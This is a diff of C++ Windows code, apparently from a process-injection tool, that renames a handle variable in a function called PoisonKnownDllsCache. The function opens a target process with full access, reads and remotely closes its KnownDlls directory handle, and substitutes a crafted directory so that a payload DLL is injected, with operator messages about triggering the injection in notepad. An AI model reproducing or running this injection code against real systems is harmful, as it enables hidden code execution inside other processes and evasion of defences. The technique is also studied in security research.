@@ -78,8 +78,8 @@ BYTE* FindBytePattern(const char* module, const char* signature)
 bool PoisonKnownDllsCache(DWORD pid, char* payloadDll, wchar_t* originalKnownDll)
 {
 	// open process for duplicating handle, suspending/resuming process
-	HANDLE notepadProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	if (!notepadProcessHandle)
+	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	if (!targetProcessHandle)
 	{
 		printf("[Error] %d - Failed to acquire notepad.exe process handle\n", GetLastError());
 		return false;
@@ -113,7 +113,7 @@ bool PoisonKnownDllsCache(DWORD pid, char* payloadDll, wchar_t* originalKnownDll
 
 	// note: there are methods to get this handle without RPM. For example to iterate over all handles and comparing for with "KnownDlls" name: NtQuerySystemInformation --> NtQueryObject: ObjectNameInformation
 	HANDLE originalKnownDllsHandle;
-	if (!ReadProcessMemory(notepadProcessHandle, originalKnownDllsHandleOffset, &originalKnownDllsHandle, sizeof(HANDLE), nullptr))
+	if (!ReadProcessMemory(targetProcessHandle, originalKnownDllsHandleOffset, &originalKnownDllsHandle, sizeof(HANDLE), nullptr))
 	{
 		printf("[Error] - Failed to read original KnownDlls handle from notepad process\n");
 		return false;
@@ -153,7 +153,7 @@ bool PoisonKnownDllsCache(DWORD pid, char* payloadDll, wchar_t* originalKnownDll
 
 	// close the KnownDlls handle in remote process
 	HANDLE duplicatedKnownDlls;
-	if (!DuplicateHandle(notepadProcessHandle, originalKnownDllsHandle, GetCurrentProcess(), &duplicatedKnownDlls, 0, TRUE, DUPLICATE_CLOSE_SOURCE))
+	if (!DuplicateHandle(targetProcessHandle, originalKnownDllsHandle, GetCurrentProcess(), &duplicatedKnownDlls, 0, TRUE, DUPLICATE_CLOSE_SOURCE))
 	{
 		printf("[Error] - Failed to DuplicateHandle KnownDlls\n");
 		return false;
@@ -164,13 +164,13 @@ bool PoisonKnownDllsCache(DWORD pid, char* payloadDll, wchar_t* originalKnownDll
 
 	// duplicate object directory for remote process
 	HANDLE duplicatedDirectory;
-	if (!DuplicateHandle(GetCurrentProcess(), directoryHandle, notepadProcessHandle, &duplicatedDirectory, 0, TRUE, DUPLICATE_SAME_ACCESS))
+	if (!DuplicateHandle(GetCurrentProcess(), directoryHandle, targetProcessHandle, &duplicatedDirectory, 0, TRUE, DUPLICATE_SAME_ACCESS))
 	{
 		printf("[Error] - Failed to DuplicateHandle directory\n");
 		return false;
 	}
 
-	CloseHandle(notepadProcessHandle);
+	CloseHandle(targetProcessHandle);
 
 	printf("[Info] - Type anything into the notepad to inject the payload dll\n");
 	return true;
